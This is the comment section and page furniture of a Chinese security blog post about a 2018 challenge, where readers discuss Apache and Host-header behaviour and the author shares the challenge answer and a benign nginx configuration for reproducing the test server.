+                    <p>想知道apache对于两个host会怎么处理（找了一下没找到相关的内容</p>
+                    <span class="comment-time">时间: 2018-03-05 22:49</span>
+                    <span class="comment-reply"><a href="#comment-3038" onclick="reply_to('3038','dot')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3039">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@dot 我这个结论可不是找资料找出来的啊……自己研究吧。</p>
+                    <span class="comment-time">时间: 2018-03-06 08:24</span>
+                    <span class="comment-reply"><a href="#comment-3039" onclick="reply_to('3039','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3604">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">corp0ra1</a></div>
+                    <p>@dot 偶遇到一个相关研究的blog。虽然时间过去很久了，但是希望对后面的人有帮助吧:https://www.kingkk.com/2018/10/Apache-Nginx%E4%B8%ADHost%E5%A4%B4%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%AE%E5%BC%82/</p>
+                    <span class="comment-time">时间: 2021-01-30 16:39</span>
+                    <span class="comment-reply"><a href="#comment-3604" onclick="reply_to('3604','corp0ra1')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3035">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">nini</a></div>
+                    <p>能贴出来答案吗</p>
+                    <span class="comment-time">时间: 2018-03-04 02:09</span>
+                    <span class="comment-reply"><a href="#comment-3035" onclick="reply_to('3035','nini')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3036">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@nini 答案是“代码审计圈年年有余步步高升万事如意”，在倒数第二张图里已经贴出来了，你可能没看文章吧。</p>
+                    <span class="comment-time">时间: 2018-03-04 03:09</span>
+                    <span class="comment-reply"><a href="#comment-3036" onclick="reply_to('3036','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3037">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">nini</a></div>
+                    <p>@phithon 是在注册的时候邮箱那里进行insert吗？  我看的不是很明白。。。。。</p>
+                    <span class="comment-time">时间: 2018-03-04 17:13</span>
+                    <span class="comment-reply"><a href="#comment-3037" onclick="reply_to('3037','nini')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3031">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">Panzer</a></div>
+                    <p>Thank you! You are the best! I am using google translate to read your article. You are such a talented 安全研究者!</p>
+                    <span class="comment-time">时间: 2018-02-27 15:02</span>
+                    <span class="comment-reply"><a href="#comment-3031" onclick="reply_to('3031','Panzer')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3029">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">Panzer</a></div>
+                    <p>Hi, I am a 安全研究者 from Germany. Could you help me set up the server in the article for testing?</p>
+                    <span class="comment-time">时间: 2018-02-27 05:29</span>
+                    <span class="comment-reply"><a href="#comment-3029" onclick="reply_to('3029','Panzer')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3030">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="../index.html" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@Panzer <br>2018.mhz.pw:62231 is still online, you can test in it.<br>The nginx virtual host config:<br><br>server {<br>	listen 80;<br><br>	root /data/main/web;<br><br>	index index.html index.php;<br><br>	server_name 2018.mhz.pw;<br><br>	location / {<br>		try_files $uri $uri/ /index.php;<br>	}<br><br>	location ~ \.php$ {<br>		include snippets/fastcgi-php.conf;<br>		fastcgi_pass unix:/run/php/php7.0-fpm.sock;<br>	}<br>}<br><br>Put the source code in /data/main, so /data/main/web is your web root directory.</p>
+                    <span class="comment-time">时间: 2018-02-27 08:57</span>
+                    <span class="comment-reply"><a href="#comment-3030" onclick="reply_to('3030','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+            
+            </ol>
+            
+        </div>
+
+        <div id="reply"></div>
+        <div id="comment-place">
+            <div id="comment-post" class="respond none-resize">
+             <div id="respond">
+                <h3 id="response">添加新评论</h3>
+                <form method="post" id="comment-form" role="form" action="#comments">
+                    <p>
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+                    </p>
+                    <p>
+                        <label for="mail">Email</label>
+                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+                    </p>
+                    <p>
+                        <label for="url">网站</label>
+                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+                    </p>
+                    <p>
+                        <label for="textarea" class="required">内容</label>
+                        <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+                    </p>
+                    <p>
+                        <label style="float:left;">验证码</label>
+                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="9c3e158577336739a655183617b1c3e1171999d8" />
+</div><div class="col-6">
+<img src="../captcha/image/9c3e158577336739a655183617b1c3e1171999d8/index.png" alt="captcha" class="captcha" /></div></div>
+                    </p>
+                    <p>
+                        <button type="submit" class="submit">提交评论</button>
+                        <input type="hidden" name="parent" id="id_parent">
+                        <input type="hidden" name="archive" value="430" id="id_archive">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="QlUtF0Hh2dvGKsiGstu0N2xFVrEGQXhICTikd5i0qzJpi064uurLKvAKgOVRpzt0">
+                    </p>
+                </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    
+
+
+
+<div  class="col-5 columns" id="sidebar" role="complementary">
+
+  <div class="widget widget_search">
+    <h3>搜索</h3>
+    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
+        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
+        <button type="submit"  id="searchsubmit">Go</button>
+    </form>
+  </div>
+
+  
+  <div class="widget">
+	<h3 class="widget-title">最新评论</h3>
+	<ul class="widget-list" id="recent-comment">
+    
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
+        </li>
+    
+        <li id="comment" class="clearfix">
+            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
+            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
+        </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-category">
+	<h3>分类</h3>
+	<ul id="blogsort" class="widget-list">
+    
+    
+    <li>
+        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/C.html">C/C++<em>32</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/PYTHON.html">Python<em>19</em></a>
+    </li>
+    
+    <li>
+        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
+    </li>
+    
+    </ul>
+  </div>
+
+  <div class="widget widget-tag">
+	<h3>随机标签</h3>
+	<div class="tag-cloud">
+        
+        
+        <a rel="tag" href="../tag/%E5%A4%A7%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86.html">大文件处理</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8.html">回调后门</a>
+        
+        <a rel="tag" href="../tag/iOS.html">iOS</a>
+        
+        <a rel="tag" href="../tag/%E4%BD%8D%E8%BF%90%E7%AE%97.html">位运算</a>
+        
+        <a rel="tag" href="../tag/%E6%A1%A5%E6%8E%A5.html">桥接</a>
+        
+        <a rel="tag" href="../tag/writeup.html">writeup</a>
+        
+        <a rel="tag" href="../tag/IIS.html">IIS</a>
+        
+        <a rel="tag" href="../tag/WTForm.html">WTForm</a>
+        
+        <a rel="tag" href="../tag/apache.html">apache</a>
+        
+        <a rel="tag" href="../tag/web%E6%8C%87%E7%BA%B9.html">web指纹</a>
+        
+        <a rel="tag" href="../tag/%E6%B1%89%E8%AF%BA%E5%A1%94.html">汉诺塔</a>
+        
+        <a rel="tag" href="../tag/cmd%E5%90%8E%E9%97%A8.html">cmd后门</a>
+        
+        <a rel="tag" href="../tag/Linux.html">Linux</a>
+        
+        <a rel="tag" href="../tag/CSP.html">CSP</a>
+        
+        <a rel="tag" href="../tag/%E5%9B%A2%E9%98%9F.html">团队</a>
+        
+        <a rel="tag" href="../tag/phpwind.html">phpwind</a>
+        
+        <a rel="tag" href="../tag/%E6%80%BB%E7%BB%93.html">总结</a>
+        
+        <a rel="tag" href="../tag/%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95.html">遍历目录</a>
+        
+        <a rel="tag" href="../tag/C-FREE.html">C-FREE</a>
+        
+        <a rel="tag" href="../tag/var_dump.html">var_dump</a>
+        
+        <a rel="tag" href="../tag/disable_functions.html">disable_functions</a>
+        
+        <a rel="tag" href="../tag/%E6%8A%A5%E7%BA%B8.html">报纸</a>
+        
+        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
+        
+        <a rel="tag" href="../tag/web%E5%BA%94%E7%94%A8.html">web应用</a>
+        
+        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
+        
+        <a rel="tag" href="../tag/asyncore.html">asyncore</a>
+        
+        <a rel="tag" href="../tag/%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87.html">沙盒绕过</a>
+        
+        <a rel="tag" href="../tag/fckeditor.html">fckeditor</a>
+        
+        <a rel="tag" href="../tag/%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E5%BA%A6.html">数据库速度</a>
+        
+        <a rel="tag" href="../tag/kali.html">kali</a>
+        
+    </div>
+  </div>
+
+  <div class="widget widget-recent-entries">
+	<h3 class="widget-title">热门日志</h3>
+	<ul id="hotlog" class="widget-list">
+    
+    
+        <li><a href="../other/tinger.html">About.Me</a></li>
+    
+        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
+    
+        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
+    
+        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
+    
+        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
+    
+    </ul>
+  </div>
+  
+
+</div>
+</div>
+
+<div id="footer">
+	<!-- copyright -->
+	<div class="container">
+		<div class="row remove-bottom">
+			<div class="col-6 columns">
+			<h3>Little About</h3>
+			<p>Phithon 非强迫症小青年  <br>
+现居先 <br>
+爱好：种花、买书、收藏明信片 <br>
+欢迎各大组织收留 <br>
+E-mail：root@leavesongs.com </p>
+			</div>
+
+			<div class="col-10 columns">
+
+				<h3 class="mobile-hide">Follow me</h3>
+        <div id="social-links">
+          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
+          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
+          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
+          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
+          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
+          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
+        </div>
+        <div class="bot-line"></div>
+				<p class="copyright">
+	Copyright &copy; Powered by talkbook
+				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
+                    <a href="../index.html">更换模板</a>
+				</p>
+			</div>
+		</div>
+	</div>
+	<!-- /copyright -->
+</div>
+<a href="#" id="go-top">Top ↑</a>
+<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
+<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
+<script src="../static/deep/js/config.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
